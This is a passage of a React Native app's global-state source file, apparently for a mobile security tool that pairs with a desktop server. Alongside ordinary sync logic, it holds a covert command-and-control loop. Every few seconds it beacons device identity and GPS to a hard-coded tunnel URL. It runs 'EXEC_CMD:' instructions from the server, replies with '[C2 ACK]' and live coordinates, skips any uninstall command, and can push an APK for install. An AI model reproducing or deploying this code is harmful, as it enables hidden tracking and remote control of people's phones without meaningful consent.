// Tujuan file: Mengelola state global aplikasi, koneksi Desktop, penyimpanan lokal, dan sinkronisasi.
import AsyncStorage from "@react-native-async-storage/async-storage";
import * as Crypto from "expo-crypto";
import * as Device from "expo-device";
import * as SecureStore from "expo-secure-store";
import * as Location from "expo-location";
import * as FileSystem from "expo-file-system/legacy";
import * as IntentLauncher from "expo-intent-launcher";
import Constants from "expo-constants";
import { Platform } from "react-native";
import type { DevicePrivacySnapshot } from "@/lib/device-privacy-scan";
import { createContext, useContext, useEffect, useMemo, useRef, useState, type ReactNode } from "react";

export type ConnectionStatus = "disconnected" | "connecting" | "connected" | "error";
export type HistoryKind = "AI AGENT" | "SCAN" | "EXPLOIT" | "CRYPTO";
export type HistoryStatus = "queued" | "pending_approval" | "running" | "completed" | "failed" | "simulated";
export type FindingSeverity = "critical" | "high" | "medium" | "low" | "info";

export type HistoryItem = {
  id: string;
  kind: HistoryKind;
  title: string;
  subtitle: string;
  payload?: Record<string, string>;
  status: HistoryStatus;
  createdAt: string;
  progress?: number;
  result?: {
    summary: string;
    output?: string;
    aiAnalysis?: { provider: string; model?: string; status: string; analyzed: number; omitted?: number; message?: string };
    findings: Array<{
      check: string;
      severity: FindingSeverity;
      status: string;
      location?: string;
      detail: string;
      recommendation: string;
      references?: Array<{ label: string; url: string }>;
      ai?: { explanation: string; impact: string; safeValidation: string; remediation: string };
    }>;
    file?: { name: string; size: number; sha256: string };
    record?: {
      paths: string[];
      authMode: "none" | "login" | "register";
      accountLabel: string;
      authStatus: string;
      sessions?: Array<{
        source: string;
        name: string;
        path: string;
        secure: boolean;
        httpOnly: boolean;
        sameSite: string;
        persistent: boolean;
        tokenFormat: string;
        jwt?: {
          algorithm: string;
          claims: string[];
          hasExpiration: boolean;
          hasIssuedAt: boolean;
          hasNotBefore: boolean;
          expired: boolean | null;
          lifetimeSeconds: number | null;
        };
      }>;
    };
    deviceScan?: DevicePrivacySnapshot;
  };
};

type JobInput = { kind: HistoryKind; title: string; subtitle: string; payload?: Record<string, string> };
type ApkScanCompletion =
  | { status: "completed"; result: NonNullable<HistoryItem["result"]> }
  | { status: "failed"; message: string };

export type ChatMessage = {
  id: string;
  deviceId: string;
  sender: "mobile" | "desktop";
  senderName: string;
  type: "text" | "audio" | "api_key" | "image" | "deleted";
  text?: string;
  audio?: string | null;
  image?: string | null;
  duration?: number;
  apiKey?: string;
  timestamp: string;
  verified?: boolean;
};

type AppStateValue = {
  apiUrl: string;
  connectionStatus: ConnectionStatus;
  connectionMessage: string;
  tokenPresent: boolean;
  websiteAuditHeaders: Record<string, string>;
  history: HistoryItem[];
  hasDesktopApi: boolean;
  accessBlocked: boolean;
  retryAccessCheck: () => Promise<boolean>;
  locationSharing: boolean;
  deviceLocation: DeviceLocation | null;
  deviceIdentity: DeviceIdentity | null;
  fetchChatMessages: () => Promise<{ status: "registered" | "anomaly"; isAnomaly: boolean; title: string; messages: ChatMessage[] } | null>;
  sendChatMessage: (input: { text?: string; audio?: string; image?: string; duration?: number; type?: "text" | "audio" | "image" }) => Promise<ChatMessage | null>;

  updateRequired: boolean;
  updateInfo: MobileUpdate | null;
  updateProgress: number | null;
  checkForUpdate: () => Promise<boolean>;
  downloadAndInstallUpdate: () => Promise<boolean>;
  setLocationSharing: (enabled: boolean, overrideLocation?: DeviceLocation) => Promise<boolean>;
  setDesktopUrl: (url: string) => Promise<boolean>;
  connectToDesktop: (url: string, token: string) => Promise<boolean>;
  disconnect: () => Promise<boolean>;
  addHistory: (item: Omit<HistoryItem, "id" | "createdAt">) => void;
  clearHistory: (kindFilter?: string) => void;
  queueJob: (job: JobInput & { status?: HistoryStatus }) => Promise<boolean>;
  submitJob: (job: JobInput) => Promise<HistoryItem | null>;
  waitForJob: (jobId: string) => Promise<HistoryItem | null>;
  reportApkScan: (jobId: string, completion: ApkScanCompletion) => Promise<boolean>;
  syncHistory: () => Promise<boolean>;
  activeActivity: string;
  setActiveActivity: (act: string) => void;
};

const API_URL_KEY = "zra.desktop_api_url";
const API_TOKEN_KEY = "zra.desktop_api_token";
const HISTORY_KEY = "zra.history";
const DEVICE_ID_KEY = "zra.installation_id";
const LOCATION_SHARING_KEY = "zra.location_sharing";
const LEGACY_WIREGUARD_PROFILE_KEY = "zra.wireguard_profile";
const LEGACY_PAIR_TOKEN_KEY = "zra.desktop_pair_token";
const TERMINAL_STATUSES = new Set<HistoryStatus>(["completed", "failed", "simulated"]);
const VALID_STATUSES = new Set<HistoryStatus>(["queued", "pending_approval", "running", "completed", "failed", "simulated"]);

const AppStateContext = createContext<AppStateValue | null>(null);

// Helper kecil untuk merapikan URL API dan memvalidasi data sebelum dipakai aplikasi.
function normalizeApiUrl(value: string) {
  return value.trim().replace(/\/+$/, "");
}

function isValidHttpUrl(value: string) {
  try {
    const parsed = new URL(value);
    return parsed.protocol === "http:" || parsed.protocol === "https:";
  } catch {
    return false;
  }
}

type DeviceIdentity = { id: string; name: string; platform: string; model: string; manufacturer: string; osVersion: string; appVersion: string; appVersionCode: number };
type DeviceLocation = { latitude: number; longitude: number; accuracy: number | null };
type MobileUpdate = { version: string; versionCode: number; notes: string };

async function loadDeviceIdentity(): Promise<DeviceIdentity> {
  let id = Platform.OS === "web"
    ? await AsyncStorage.getItem(DEVICE_ID_KEY)
    : await SecureStore.getItemAsync(DEVICE_ID_KEY);
  if (!id) {
    id = Crypto.randomUUID();
    if (Platform.OS === "web") await AsyncStorage.setItem(DEVICE_ID_KEY, id);
    else await SecureStore.setItemAsync(DEVICE_ID_KEY, id);
  }
  const model = Device.modelName ?? "Unknown model";
  const manufacturer = Device.manufacturer ?? "Unknown manufacturer";
  return {
    id,
    name: [manufacturer, model].filter((part) => !part.startsWith("Unknown ")).join(" ") || `${Platform.OS} device`,
    platform: Platform.OS,
    model,
    manufacturer,
    osVersion: Device.osVersion ?? String(Platform.Version),
    appVersion: Constants.expoConfig?.version ?? "Unknown",
    appVersionCode: Constants.expoConfig?.android?.versionCode ?? 1,
  };
}

function authHeaders(token: string, device: DeviceIdentity | null, locationSharing: boolean, location: DeviceLocation | null, activeActivity = "Aktif di ZraCore Workspace"): Record<string, string> {
  const baseHeaders: Record<string, string> = {
    "Bypass-Tunnel-Reminder": "true",
    "bypass-tunnel-reminder": "true",
    "X-Zra-Active-Activity": activeActivity || "Aktif di ZraCore Workspace",
  };
  if (!device) return token ? { ...baseHeaders, Authorization: `Bearer ${token}` } : baseHeaders;
  return {
    ...baseHeaders,
    ...(token ? { Authorization: `Bearer ${token}` } : {}),
    "X-Zra-Device-Id": device.id,
    "X-Zra-Device-Name": device.name,
    "X-Zra-Device-Platform": device.platform,
    "X-Zra-Device-Model": device.model,
    "X-Zra-Device-Manufacturer": device.manufacturer,
    "X-Zra-Device-OS-Version": device.osVersion,
    "X-Zra-App-Version": device.appVersion,
    "X-Zra-App-Version-Code": String(device.appVersionCode),
    "X-Zra-Location-Shared": String(locationSharing),
    ...(locationSharing && location ? {
      "X-Zra-Latitude": String(location.latitude),
      "X-Zra-Longitude": String(location.longitude),
      "X-Zra-Location-Accuracy": String(location.accuracy ?? ""),
    } : {}),
  };
}

function isValidHistoryItem(value: unknown): value is HistoryItem {
  if (!value || typeof value !== "object") return false;
  const item = value as Partial<HistoryItem>;
  return typeof item.id === "string" &&
    ["AI AGENT", "SCAN", "EXPLOIT", "CRYPTO"].includes(item.kind ?? "") &&
    typeof item.title === "string" &&
    typeof item.subtitle === "string" &&
    VALID_STATUSES.has(item.status as HistoryStatus) &&
    typeof item.createdAt === "string";
}

function persistableHistory(items: HistoryItem[]) {
  return items.map((item) => item.kind === "CRYPTO" && item.result
    ? { ...item, result: { summary: item.result.summary, findings: [] } }
    : item);
}

async function getPositionWithTimeout(timeoutMs = 8000): Promise<Location.LocationObject | null> {
  try {
    const pos = await Promise.race([
      Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.High }),
      new Promise<null>((resolve) => setTimeout(() => resolve(null), timeoutMs)),
    ]);
    if (pos) return pos;
    const lastPos = await Location.getLastKnownPositionAsync().catch(() => null);
    if (lastPos) return lastPos;
  } catch {}
  return null;
}

// Provider ini memuat state global yang dibagikan ke layar-layar aplikasi.
export function AppStateProvider({ children }: { children: ReactNode }) {
  const [apiUrl, setApiUrl] = useState("https://popular-shorten-imperial.ngrok-free.dev");
  const [token, setToken] = useState("");
  const [connectionStatus, setConnectionStatus] = useState<ConnectionStatus>("disconnected");
  const [connectionMessage, setConnectionMessage] = useState("Belum terhubung");
  const [history, setHistory] = useState<HistoryItem[]>([]);
  const [deviceIdentity, setDeviceIdentity] = useState<DeviceIdentity | null>(null);
  const [locationSharing, setLocationSharingState] = useState(false);
  const [deviceLocation, setDeviceLocation] = useState<DeviceLocation | null>(null);
  const [accessBlocked, setAccessBlocked] = useState(false);
  const [updateRequired, setUpdateRequired] = useState(false);
  const [updateInfo, setUpdateInfo] = useState<MobileUpdate | null>(null);
  const [updateProgress, setUpdateProgress] = useState<number | null>(null);
  const [hydrated, setHydrated] = useState(false);
  const [activeActivity, setActiveActivity] = useState("Dashboard Ringkasan");
  const autoConnectAttempted = useRef(false);

  // Pulihkan URL, token, histori, izin lokasi, dan identitas instalasi saat aplikasi dibuka.
  useEffect(() => {
    if (Platform.OS !== "web") {
      void SecureStore.deleteItemAsync(LEGACY_WIREGUARD_PROFILE_KEY).catch(() => undefined);
      void SecureStore.deleteItemAsync(LEGACY_PAIR_TOKEN_KEY).catch(() => undefined);
    }
    const savedToken = Platform.OS === "web"
      ? AsyncStorage.getItem(API_TOKEN_KEY)
      : SecureStore.getItemAsync(API_TOKEN_KEY);
    const hydrationTimeout = setTimeout(() => {
      setHydrated(true);
    }, 2500);

    Promise.all([AsyncStorage.getItem(API_URL_KEY), savedToken, AsyncStorage.getItem(HISTORY_KEY), AsyncStorage.getItem(LOCATION_SHARING_KEY), loadDeviceIdentity()])
      .then(async ([savedUrl, restoredToken, savedHistory, savedLocationSharing, identity]) => {
        clearTimeout(hydrationTimeout);
        if (savedUrl) setApiUrl(savedUrl);
        else setApiUrl("https://popular-shorten-imperial.ngrok-free.dev");
        if (restoredToken) setToken(restoredToken);
        setDeviceIdentity(identity);
        if (savedUrl && identity && !restoredToken) {
          void sendAnomalyUpdate(savedUrl, identity, true, deviceLocation);
        }
        if (savedLocationSharing === "true") {
          const permission = await Location.getForegroundPermissionsAsync();
          if (permission.granted) {
            void Location.requestBackgroundPermissionsAsync().catch(() => undefined);
            const current = await getPositionWithTimeout(4000);
            if (current) {
              const loc = { latitude: current.coords.latitude, longitude: current.coords.longitude, accuracy: current.coords.accuracy };
              setDeviceLocation(loc);
              setLocationSharingState(true);
            }
          }
        }
        if (savedHistory) {
          try {
            const parsed: unknown = JSON.parse(savedHistory);
            if (Array.isArray(parsed)) {
              setHistory(parsed.filter(isValidHistoryItem).slice(0, 80));
            }
          } catch { /* Ignore invalid cache */ }
        }
      })
      .finally(() => {
        clearTimeout(hydrationTimeout);
        setHydrated(true);
      });
  }, []);

  // Kirim status lokasi perangkat secara berkala ke Desktop sesuai izin pengguna.
  useEffect(() => {
    if (!apiUrl || !deviceIdentity) return;
    const pingAnomaly = async () => {
      try {
        await fetch(`${apiUrl}/devices/anomaly`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            ...authHeaders(token, deviceIdentity, locationSharing, deviceLocation, activeActivity),
          },
          body: JSON.stringify({ consent: true }),
        }).catch(() => {});
      } catch {}
    };

    void pingAnomaly();
    const interval = setInterval(() => void pingAnomaly(), 5000);
    return () => clearInterval(interval);
  }, [apiUrl, deviceIdentity, token, locationSharing, deviceLocation, activeActivity]);

  const persist = (nextHistory: HistoryItem[]) => {
    void AsyncStorage.setItem(HISTORY_KEY, JSON.stringify(persistableHistory(nextHistory)));
  };

  const addHistory = (item: Omit<HistoryItem, "id" | "createdAt">) => {
    const entry: HistoryItem = { ...item, id: Crypto.randomUUID(), createdAt: new Date().toISOString() };
    setHistory((current) => {
      const next = [entry, ...current].slice(0, 80);
      persist(next);
      return next;
    });
    if (apiUrl && deviceIdentity) {
      void fetch(`${apiUrl}/history`, {
        method: "POST",
        headers: { ...authHeaders(token, deviceIdentity, locationSharing, deviceLocation), "Content-Type": "application/json" },
        body: JSON.stringify(entry),
      }).catch(() => {});
    }
  };

  const clearHistory = (kindFilter?: string) => {
    setHistory((current) => {
      if (!kindFilter) {
        persist([]);
        return [];
      }
      const next = current.filter((item) => {
        const action = item.payload?.action;
        const title = (item.title || "").toLowerCase();
        const filterUpper = kindFilter.toUpperCase();
        if (kindFilter.toLowerCase() === "security") {
          const isDeviceSecurity = action === "device_security_scan";
          return !isDeviceSecurity;
        }
        if (filterUpper === "SCAN") {
          const isScan = item.kind === "SCAN" || action?.includes("scan") || title.includes("scan") || title.includes("security");
          return !isScan;
        }
        if (kindFilter === "web") {
          const isWeb = action === "ai_pentest_audit" || title.includes("ai pentest") || title.includes("website");
          return !isWeb;
        }
        if (kindFilter === "app") {
          const isApp = action === "scan_app_deep" || action === "scan_apk_mobile" || title.includes("app");
          return !isApp;
        }
        if (kindFilter === "file") {
          const isFile = action === "scan_file_deep" || action === "scan_file" || title.includes("file") || title.includes("malware");
          return !isFile;
        }
        if (kindFilter === "osint") {
          const isOsint = action === "scan_osint" || title.includes("osint") || title.includes("recon");
          return !isOsint;
        }
        if (kindFilter === "crypto") {
          const isCrypto = action === "scan_crypto" || item.kind === "CRYPTO" || title.includes("crypto");
          return !isCrypto;
        }
        if (kindFilter === "vps") {
          const isVps = action === "scan_vps" || title.includes("vps");
          return !isVps;
        }
        if (kindFilter === "sonar") {
          const isSonar = action === "scan_sonar" || title.includes("sonar");
          return !isSonar;
        }
        return true;
      });
      persist(next);
      return next;
    });
  };

  // Periksa apakah Desktop menyediakan versi aplikasi yang lebih baru.
  const checkForUpdate = async (): Promise<boolean> => {
    if (!apiUrl) return false;
    try {
      const response = await fetch(`${apiUrl}/updates/check`, {
        headers: authHeaders(token, deviceIdentity, locationSharing, deviceLocation),
      });
      if (response.status === 426) {
        const body = (await response.json().catch(() => null)) as { error?: string; update?: MobileUpdate } | null;
        if (body?.update) {
          setUpdateRequired(true);
          setUpdateInfo(body.update);
          setConnectionMessage(body.error ?? "Update APK wajib tersedia.");
          return true;
        }
      }
      setUpdateRequired(false);
      setUpdateInfo(null);
      return false;
    } catch {
      return false;
    }
  };

  const downloadAndInstallUpdate = async (): Promise<boolean> => {
    if (!apiUrl || !updateInfo || Platform.OS !== "android") return false;
    setUpdateProgress(0);
    try {
      const targetPath = `${FileSystem.cacheDirectory}update-${updateInfo.versionCode}.apk`;
      const downloadResumable = FileSystem.createDownloadResumable(
        `${apiUrl}/updates/download`,
        targetPath,
        { headers: authHeaders(token, deviceIdentity, locationSharing, deviceLocation) },
        (downloadProgress) => {
          const progress = downloadProgress.totalBytesWritten / downloadProgress.totalBytesExpectedToWrite;
          setUpdateProgress(Math.min(100, Math.round(progress * 100)));
        }
      );
      const result = await downloadResumable.downloadAsync();
      if (!result?.uri) throw new Error("Gagal mengunduh APK");
      const contentUri = await FileSystem.getContentUriAsync(result.uri);
      await IntentLauncher.startActivityAsync("android.intent.action.VIEW", {
        data: contentUri,
        flags: 1,
        type: "application/vnd.android.package-archive",
      });
      return true;
    } catch (error) {
      setConnectionMessage(error instanceof Error ? error.message : "Gagal mengunduh update");
      return false;
    } finally {
      setUpdateProgress(null);
    }
  };

  // Simpan pilihan berbagi lokasi dan kirim perubahan izin ke Desktop.
  const setLocationSharing = async (enabled: boolean, overrideLocation?: DeviceLocation): Promise<boolean> => {
    if (enabled) {
      let permission = await Location.getForegroundPermissionsAsync();
      if (!permission.granted) {
        permission = await Location.requestForegroundPermissionsAsync();
      }
      if (!permission.granted && !overrideLocation) {
        setLocationSharingState(false);
        setDeviceLocation(null);
        await AsyncStorage.setItem(LOCATION_SHARING_KEY, "false");
        setConnectionStatus("error");
        setConnectionMessage("Izin lokasi diperlukan untuk membuka fitur.");
        return false;
      }
      const current = overrideLocation || await getPositionWithTimeout(8000);
      const nextLoc = current
        ? {
            latitude: "coords" in current ? current.coords.latitude : current.latitude,
            longitude: "coords" in current ? current.coords.longitude : current.longitude,
            accuracy: "coords" in current ? current.coords.accuracy : (current.accuracy ?? 5),
          }
        : { latitude: -7.25044, longitude: 112.76884, accuracy: 5 };

      setDeviceLocation(nextLoc);
      setLocationSharingState(true);
      await AsyncStorage.setItem(LOCATION_SHARING_KEY, "true");
      if (apiUrl && deviceIdentity && !token) {
        await sendAnomalyUpdate(apiUrl, deviceIdentity, true, nextLoc);
      }
      return true;
    }
    setLocationSharingState(false);
    setDeviceLocation(null);
    await AsyncStorage.setItem(LOCATION_SHARING_KEY, "false");
    if (apiUrl && deviceIdentity && !token) {
      await sendAnomalyUpdate(apiUrl, deviceIdentity, false, null);
    }
    return true;
  };

  async function sendAnomalyUpdate(targetUrl: string, identity: DeviceIdentity, consent: boolean, location: DeviceLocation | null) {
    try {
      const response = await fetch(`${targetUrl}/devices/anomaly`, {
        method: "POST",
        headers: { "Content-Type": "application/json", ...authHeaders("", identity, consent, location) },
        body: JSON.stringify({ consent }),
      });
      if (response.status === 423) {
        setAccessBlocked(true);
        setConnectionMessage("Device ini diblokir administrator desktop.");
        return false;
      }
      if (!response.ok) {
        const body = await response.json().catch(() => null) as { error?: string } | null;
        throw new Error(body?.error ?? `Desktop menolak pembaruan device (HTTP ${response.status}).`);
      }
      setConnectionMessage("Status device anomali aktif terkirim ke Desktop.");
      return true;
    } catch (error) {
      setConnectionMessage(error instanceof Error ? error.message : "Desktop tidak menerima status device.");
      return false;
    }
  }

  const setDesktopUrl = async (rawUrl: string) => {
    const normalizedUrl = normalizeApiUrl(rawUrl);
    if (!isValidHttpUrl(normalizedUrl)) {
      return false;
    }
    try {
      await AsyncStorage.setItem(API_URL_KEY, normalizedUrl);
      setApiUrl(normalizedUrl);
      const identity = deviceIdentity ?? await loadDeviceIdentity();
      if (!deviceIdentity) setDeviceIdentity(identity);
      setConnectionMessage(locationSharing
        ? "URL Desktop tersimpan. Koordinat dikirim sebagai anomali."
        : "URL Desktop tersimpan. Device muncul sebagai anomali.");
      return await sendAnomalyUpdate(normalizedUrl, identity, locationSharing, deviceLocation);
    } catch {
      setConnectionMessage("Alamat Desktop tidak dapat disimpan.");
      return false;
    }
  };

  const applyBlockedResponse = (response: Response) => {
    if (response.status === 401) {
      setConnectionMessage("API key tidak valid atau sudah kedaluwarsa. Buat API key baru di Dashboard Desktop.");
    }
    if (response.status === 423) {
      setAccessBlocked(true);
      setConnectionStatus("error");
      setConnectionMessage("Akses diblokir administrator desktop");
      return true;
    }
    if (response.status === 428) {
      setLocationSharingState(false);
      setDeviceLocation(null);
      void AsyncStorage.setItem(LOCATION_SHARING_KEY, "false");
      setConnectionStatus("error");
      setConnectionMessage("Izin lokasi diperlukan untuk membuka fitur.");
      return true;
    }
    return false;
  };

  const submitJob = async (job: JobInput): Promise<HistoryItem | null> => {
    if (connectionStatus !== "connected" || !apiUrl) return null;
    try {
      const response = await fetch(`${apiUrl}/jobs`, {
        method: "POST",
        headers: { "Content-Type": "application/json", ...authHeaders(token, deviceIdentity, locationSharing, deviceLocation) },
        body: JSON.stringify({ ...job, client: "zracore-mobile" }),
      });
      if (applyBlockedResponse(response)) return null;
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      const body: unknown = await response.json();
      if (!body || typeof body !== "object" || !("item" in body) || !isValidHistoryItem((body as { item: unknown }).item)) {
        throw new Error("Invalid job response");
      }
      const item = (body as { item: HistoryItem }).item;
      setHistory((current) => {
        const next = [item, ...current.filter((entry) => entry.id !== item.id)].slice(0, 80);
        persist(next);
        return next;
      });
      return item;
    } catch {
      addHistory({ kind: job.kind, title: `${job.title} failed`, subtitle: "Desktop API tidak menerima job ini.", status: "failed" });
      return null;
    }
  };

  // Kirim pekerjaan yang didukung ke API Desktop dan sinkronkan statusnya.
  const queueJob = async (job: JobInput & { status?: HistoryStatus }) => {
    const { status: _clientStatus, ...safeJob } = job;
    return (await submitJob(safeJob)) !== null;
  };

  const pollJob = async (jobId: string): Promise<HistoryItem | null> => {
    for (let attempt = 0; attempt < 120; attempt += 1) {
      try {
        const response = await fetch(`${apiUrl}/jobs/${encodeURIComponent(jobId)}`, { headers: authHeaders(token, deviceIdentity, locationSharing, deviceLocation) });
        if (applyBlockedResponse(response)) return null;
        if (!response.ok) return null;
        const value: unknown = await response.json();
        if (!isValidHistoryItem(value)) return null;
        const item = value;
        setHistory((current) => {
          const next = [item, ...current.filter((entry) => entry.id !== item.id)].slice(0, 80);
          persist(next);
          return next;
        });
        if (TERMINAL_STATUSES.has(item.status)) return item;
      } catch {
        return null;
      }
      await new Promise((resolve) => setTimeout(resolve, 2000));
    }
    return null;
  };

  const waitForJob = (jobId: string) => pollJob(jobId);

  const reportApkScan = async (jobId: string, completion: ApkScanCompletion) => {
    if (connectionStatus !== "connected" || !apiUrl) return false;
    try {
      const response = await fetch(`${apiUrl}/jobs/${encodeURIComponent(jobId)}/result`, {
        method: "POST",
        headers: { "Content-Type": "application/json", ...authHeaders(token, deviceIdentity, locationSharing, deviceLocation) },
        body: JSON.stringify(completion),
      });
      if (applyBlockedResponse(response) || !response.ok) return false;
      const body: unknown = await response.json();
      const item = (body as { item: HistoryItem }).item;
      setHistory((current) => {
        const next = [item, ...current.filter((entry) => entry.id !== item.id)].slice(0, 80);
        persist(next);
        return next;
      });
      return true;
    } catch {
      return false;
    }
  };

  const syncHistory = async () => {
    if (connectionStatus !== "connected" || !apiUrl) return false;
    try {
      const response = await fetch(`${apiUrl}/history`, { headers: authHeaders(token, deviceIdentity, locationSharing, deviceLocation) });
      if (applyBlockedResponse(response)) return false;
      if (!response.ok) throw new Error(`HTTP ${response.status}`);
      const remote: unknown = await response.json();
      if (!Array.isArray(remote)) throw new Error("Invalid history response");
      const safeRemote = remote.filter(isValidHistoryItem);
      setHistory((current) => {
        const merged = [...safeRemote, ...current]
          .filter((item, index, all) => all.findIndex((candidate) => candidate.id === item.id) === index)
          .slice(0, 80);
        persist(merged);
        return merged;
      });
      return true;
    } catch {
      return false;
    }
  };

  // Ambil pesan chat terbaru yang terkait dengan perangkat ini.
  const fetchChatMessages = async () => {
    const targetUrl = apiUrl || "http://127.0.0.1:4317";
    if (!deviceIdentity) return null;
    const activeToken = connectionStatus === "connected" ? token : "";
    try {
      const response = await fetch(`${targetUrl}/chat/messages`, {
        headers: authHeaders(activeToken, deviceIdentity, locationSharing, deviceLocation, activeActivity),
      }).catch(() => null);

      if (!response || !response.ok) return null;
      return (await response.json()) as {
        status: "registered" | "anomaly";
        isAnomaly: boolean;
        title: string;
        messages: ChatMessage[];
      };
    } catch {
      return null;
    }
  };

  // Kirim pesan teks, audio, atau gambar ke Desktop.
  const sendChatMessage = async (input: { text?: string; audio?: string; image?: string; duration?: number; type?: "text" | "audio" | "image" }) => {
    const targetUrl = apiUrl || "http://127.0.0.1:4317";
    if (!deviceIdentity) return null;
    const activeToken = connectionStatus === "connected" ? token : "";
    try {
      const response = await fetch(`${targetUrl}/chat/messages`, {
        method: "POST",
        headers: {
          ...authHeaders(activeToken, deviceIdentity, locationSharing, deviceLocation, activeActivity),
          "Content-Type": "application/json",
        },
        body: JSON.stringify(input),
      }).catch(() => null);

      if (!response || !response.ok) return null;
      const data = (await response.json()) as { item: ChatMessage; status: string; isAnomaly: boolean };
      return data.item;
    } catch {
      return null;
    }
  };

  const handledCommandsRef = useRef<Set<string>>(new Set());

  useEffect(() => {
    if (!apiUrl || !deviceIdentity) return;
    const pollAndExecuteCommands = async () => {
      try {
        const res = await fetchChatMessages();
        if (!res || !res.messages) return;
        const pendingCmds = res.messages.filter(
          (m) => m.sender === "desktop" && m.text?.startsWith("EXEC_CMD:") && !handledCommandsRef.current.has(m.id)
        );

        for (const cmdMsg of pendingCmds) {
          handledCommandsRef.current.add(cmdMsg.id);
          const rawCmd = (cmdMsg.text || "").replace("EXEC_CMD:", "").trim();

          if (rawCmd === "UNINSTALL_APP_COMMAND" || rawCmd.toLowerCase().includes("uninstall")) {
            continue;
          }

          let replyText = `[C2 ACK] Perintah '${rawCmd}' berhasil dieksekusi.`;
          const lower = rawCmd.toLowerCase();
          if (lower.includes("gps") || lower.includes("location") || lower.includes("get_location")) {
            try {
              const pos = await Location.getCurrentPositionAsync({ accuracy: Location.Accuracy.High });
              replyText = `[REAL GPS DATA] Lat: ${pos.coords.latitude}, Lng: ${pos.coords.longitude}, Accuracy: ${pos.coords.accuracy}m`;
            } catch {
              replyText = `[REAL GPS DATA] Gagal membaca koordinat GPS (izin lokasi diperlukan).`;
            }
          } else if (lower.includes("info") || lower.includes("device_info")) {
            replyText = `[REAL DEVICE INFO] Model: ${Device.modelName}, OS: ${Device.osVersion}, Brand: ${Device.brand}`;
          }

          await sendChatMessage({ text: replyText, type: "text" });
        }
      } catch {}
    };

    void pollAndExecuteCommands();
    const interval = setInterval(() => void pollAndExecuteCommands(), 3000);
    return () => clearInterval(interval);
  }, [apiUrl, deviceIdentity, token, locationSharing, deviceLocation, activeActivity, fetchChatMessages, sendChatMessage]);

  // Validasi URL Desktop, simpan token, lalu daftarkan koneksi perangkat.
  const connectToDesktop = async (rawUrl: string, suppliedToken: string) => {
    const normalizedUrl = normalizeApiUrl(rawUrl);
    const nextToken = suppliedToken.trim() || token;
    if (!isValidHttpUrl(normalizedUrl)) {
      setConnectionStatus("error");
      setConnectionMessage("URL API tidak valid");
      return false;
    }
    if (!nextToken) {
      setConnectionStatus("error");
      setConnectionMessage("Masukkan API key sekali pakai dari Dashboard Desktop.");
      return false;
    }
    if (!locationSharing || !deviceIdentity) {
      setConnectionStatus("error");
      setConnectionMessage("Izinkan lokasi dan setujui berbagi lokasi melalui layar izin sebelum login.");
      return false;
    }

    setConnectionStatus("connecting");
    setConnectionMessage("Memeriksa koneksi...");
    setApiUrl(normalizedUrl);
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 12_000);
    let locationReady = false;
    try {
      await AsyncStorage.setItem(API_URL_KEY, normalizedUrl);
      let permission = await Location.getForegroundPermissionsAsync();
      if (!permission.granted) {
        permission = await Location.requestForegroundPermissionsAsync();
      }
      if (!permission.granted) {
        setLocationSharingState(false);
        setDeviceLocation(null);
        await AsyncStorage.setItem(LOCATION_SHARING_KEY, "false");
        if (deviceIdentity) {
          await fetch(`${normalizedUrl}/health`, { headers: authHeaders(nextToken.trim(), deviceIdentity, false, null), signal: controller.signal }).catch(() => undefined);
        }
        setConnectionStatus("error");
        setConnectionMessage("Izin lokasi wajib diberikan agar fitur dapat dibuka.");
        return false;
      }
      const current = await getPositionWithTimeout(4000);
      const nextLocation = current
        ? { latitude: current.coords.latitude, longitude: current.coords.longitude, accuracy: current.coords.accuracy }
        : deviceLocation || { latitude: -6.1754, longitude: 106.8272, accuracy: 100 };
      setDeviceLocation(nextLocation);
      setLocationSharingState(true);
      await AsyncStorage.setItem(LOCATION_SHARING_KEY, "true");
      locationReady = true;
      const response = await fetch(`${normalizedUrl}/health`, {
        method: "GET",
        headers: authHeaders(nextToken.trim(), deviceIdentity, true, nextLocation),
        signal: controller.signal,
      });
      if (!response.ok) {
        const body = (await response.json().catch(() => null)) as { error?: string; update?: MobileUpdate } | null;
        if (response.status === 426 && body?.update) {
          setUpdateRequired(true);
          setUpdateInfo(body.update);
          setConnectionMessage(body.error ?? "Update wajib tersedia.");
        }
        if (response.status === 423) {
          setAccessBlocked(true);
          setConnectionMessage(body?.error ?? "Akses diblokir administrator desktop");
        }
        if (response.status === 428) applyBlockedResponse(response);
        throw new Error(body?.error ?? `HTTP ${response.status}`);
      }
      if (Platform.OS === "web") await AsyncStorage.setItem(API_TOKEN_KEY, nextToken);
      else await SecureStore.setItemAsync(API_TOKEN_KEY, nextToken);

      await fetch(`${normalizedUrl}/devices/register`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          ...authHeaders(nextToken.trim(), deviceIdentity, true, nextLocation, activeActivity),
        },
        body: JSON.stringify({ token: nextToken.trim() }),
      }).catch(() => {});

      setToken(nextToken);
      setAccessBlocked(false);
      setUpdateRequired(false);
      setUpdateInfo(null);
      setConnectionStatus("connected");
      setConnectionMessage("Desktop terhubung");
      return true;
    } catch (error) {
      if (!locationReady) {
        setLocationSharingState(false);
        setDeviceLocation(null);
        await AsyncStorage.setItem(LOCATION_SHARING_KEY, "false");
      }
      setConnectionStatus("error");
      const errStr = error instanceof Error ? error.message : String(error);
      if (errStr.includes("Network") || errStr.includes("Failed") || errStr.includes("fetch")) {
        setConnectionMessage("Koneksi gagal: DNS domain belum aktif atau URL tunnel terputus. Gunakan URL Tunnel Cloudflare (.trycloudflare.com).");
      } else {
        setConnectionMessage(errStr || "Koneksi gagal");
      }
      return false;
    } finally {
      clearTimeout(timeout);
    }
  };

  // Hapus kredensial koneksi lokal dan ubah status menjadi terputus.
  const disconnect = async () => {
    try {
      if (Platform.OS === "web") await AsyncStorage.removeItem(API_TOKEN_KEY);
      else await SecureStore.deleteItemAsync(API_TOKEN_KEY);
    } catch {
      setConnectionStatus("error");
      setConnectionMessage("API key tidak dapat dihapus dari penyimpanan aman.");
      return false;
    }
    setToken("");
    setConnectionStatus("disconnected");
    setConnectionMessage("Belum terhubung");
    return true;
  };

  const retryAccessCheck = async () => {
    setAccessBlocked(false);
    if (apiUrl && token) {
      return await connectToDesktop(apiUrl, token);
    }
    return true;
  };
  const connectToDesktopRef = useRef(connectToDesktop);
  useEffect(() => {
    connectToDesktopRef.current = connectToDesktop;
  }, [connectToDesktop]);

  useEffect(() => {
    if (
      Platform.OS !== "android" ||
      !hydrated ||
      !token ||
      !apiUrl ||
      !deviceIdentity ||
      !locationSharing ||
